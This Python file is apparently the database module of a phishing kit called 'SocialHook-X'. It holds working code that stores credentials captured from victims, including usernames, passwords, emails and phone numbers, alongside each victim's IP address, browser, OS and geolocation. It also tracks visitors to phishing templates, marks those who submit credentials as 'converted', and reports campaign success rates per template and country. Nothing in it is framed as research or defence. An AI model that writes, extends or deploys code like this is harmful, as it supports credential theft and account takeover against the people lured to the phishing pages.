"""
SocialHook-X Database Module
Handles credential storage and analytics
"""

import sqlite3
import json
import logging
from pathlib import Path
from datetime import datetime
from typing import Dict, List, Tuple, Optional

logger = logging.getLogger(__name__)

class CredentialDB:
    """Database manager for credentials and analytics"""
    
    def __init__(self, db_path: str = "captured_data/credentials.db"):
        self.db_path = db_path
        self.init_database()
    
    def init_database(self):
        """Initialize database with required tables"""
        Path(self.db_path).parent.mkdir(parents=True, exist_ok=True)
        
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # Credentials table
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS credentials (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                template TEXT NOT NULL,
                username TEXT,
                password TEXT,
                email TEXT,
                phone TEXT,
                extra_data TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                ip_address TEXT,
                user_agent TEXT,
                browser TEXT,
                os TEXT
            )
        """)
        
        # Visitor tracking table
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS visitors (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                template TEXT NOT NULL,
                ip_address TEXT,
                user_agent TEXT,
                referrer TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                geo_data TEXT,
                converted BOOLEAN DEFAULT 0
            )
        """)
        
        # Campaign metadata table
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS campaigns (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                template TEXT NOT NULL,
                url TEXT,
                tunnel_service TEXT,
                port INTEGER,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                stopped_at DATETIME,
                status TEXT DEFAULT 'active'
            )
        """)
        
        # Geolocation cache table
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS geo_cache (
                ip_address TEXT PRIMARY KEY,
                country TEXT,
                city TEXT,
                latitude REAL,
                longitude REAL,
                isp TEXT,
                cached_at DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        """)
        
        conn.commit()
        conn.close()
        logger.info(f"Database initialized at {self.db_path}")
    
    def add_credential(self, cred_dict: Dict) -> int:
        """Store captured credential"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute("""
                INSERT INTO credentials 
                (template, username, password, email, phone, extra_data, 
                 ip_address, user_agent, browser, os)
                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
            """, (
                cred_dict.get('template'),
                cred_dict.get('username'),
                cred_dict.get('password'),
                cred_dict.get('email'),
                cred_dict.get('phone'),
                json.dumps(cred_dict.get('extra_data', {})),
                cred_dict.get('ip_address'),
                cred_dict.get('user_agent'),
                cred_dict.get('browser'),
                cred_dict.get('os')
            ))
            
            conn.commit()
            cred_id = cursor.lastrowid
            conn.close()
            
            logger.info(f"Credential stored (ID: {cred_id}, Template: {cred_dict.get('template')})")
            return cred_id
        
        except sqlite3.Error as e:
            logger.error(f"Database error adding credential: {e}")
            return -1
    
    def add_visitor(self, visitor_dict: Dict) -> int:
        """Track visitor visit"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute("""
                INSERT INTO visitors 
                (template, ip_address, user_agent, referrer, geo_data)
                VALUES (?, ?, ?, ?, ?)
            """, (
                visitor_dict.get('template'),
                visitor_dict.get('ip_address'),
                visitor_dict.get('user_agent'),
                visitor_dict.get('referrer'),
                json.dumps(visitor_dict.get('geo_data', {}))
            ))
            
            conn.commit()
            visitor_id = cursor.lastrowid
            conn.close()
            
            return visitor_id
        
        except sqlite3.Error as e:
            logger.error(f"Database error adding visitor: {e}")
            return -1
    
    def mark_converted(self, visitor_id: int) -> bool:
        """Mark visitor as converted (provided credentials)"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute("UPDATE visitors SET converted = 1 WHERE id = ?", (visitor_id,))
            
            conn.commit()
            conn.close()
            return True
        
        except sqlite3.Error as e:
            logger.error(f"Database error marking converted: {e}")
            return False
    
    def get_credentials(self, template: Optional[str] = None) -> List[Dict]:
        """Get all or filtered credentials"""
        try:
            conn = sqlite3.connect(self.db_path)
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            
            if template:
                cursor.execute("SELECT * FROM credentials WHERE template = ? ORDER BY timestamp DESC", (template,))
            else:
                cursor.execute("SELECT * FROM credentials ORDER BY timestamp DESC")
            
            rows = cursor.fetchall()
            conn.close()
            
            return [dict(row) for row in rows]
        
        except sqlite3.Error as e:
            logger.error(f"Database error getting credentials: {e}")
            return []
    
    def get_statistics(self) -> Dict:
        """Get campaign statistics"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            # Total credentials
            cursor.execute("SELECT COUNT(*) FROM credentials")
            total_creds = cursor.fetchone()[0]
            
            # Total visitors
            cursor.execute("SELECT COUNT(*) FROM visitors")
            total_visitors = cursor.fetchone()[0]
            
            # Conversion rate
            cursor.execute("SELECT COUNT(*) FROM visitors WHERE converted = 1")
            converted = cursor.fetchone()[0]
            
            # Per template stats
            cursor.execute("""
                SELECT template, COUNT(*) as count 
                FROM credentials 
                GROUP BY template 
                ORDER BY count DESC
            """)
            template_stats = {row[0]: row[1] for row in cursor.fetchall()}
            
            # Top countries
            cursor.execute("""
                SELECT country, COUNT(*) as count 
                FROM geo_cache 
                GROUP BY country 
                ORDER BY count DESC 
                LIMIT 10
            """)
            top_countries = {row[0]: row[1] for row in cursor.fetchall()}
            
            conn.close()
            
            return {
                'total_credentials': total_creds,
                'total_visitors': total_visitors,
                'conversion_rate': (converted / total_visitors * 100) if total_visitors > 0 else 0,
                'template_stats': template_stats,
                'top_countries': top_countries
            }
        
        except sqlite3.Error as e:
            logger.error(f"Database error getting statistics: {e}")
            return {}
    
    def cache_geo_data(self, ip: str, geo_data: Dict) -> bool:
        """Cache geolocation data"""
        try:
            conn = sqlite3.connect(self.db_path)
            cursor = conn.cursor()
            
            cursor.execute("""
                INSERT OR REPLACE INTO geo_cache 
                (ip_address, country, city, latitude, longitude, isp)
                VALUES (?, ?, ?, ?, ?, ?)
            """, (
                ip,
                geo_data.get('country'),
                geo_data.get('city'),
                geo_data.get('latitude'),
                geo_data.get('longitude'),
                geo_data.get('isp')
            ))
            
            conn.commit()
            conn.close()
            return True
        
        except sqlite3.Error as e:
            logger.error(f"Database error caching geo data: {e}")
            return False
    
    def get_cached_geo(self, ip: str) -> Optional[Dict]:
        """Get cached geolocation data"""
        try:
            conn = sqlite3.connect(self.db_path)
            conn.row_factory = sqlite3.Row
            cursor = conn.cursor()
            
            cursor.execute("SELECT * FROM geo_cache WHERE ip_address = ?", (ip,))
            row = cursor.fetchone()
            conn.close()
            
            return dict(row) if row else None
        
        except sqlite3.Error as e:
            logger.error(f"Database error getting cached geo: {e}")
            return None
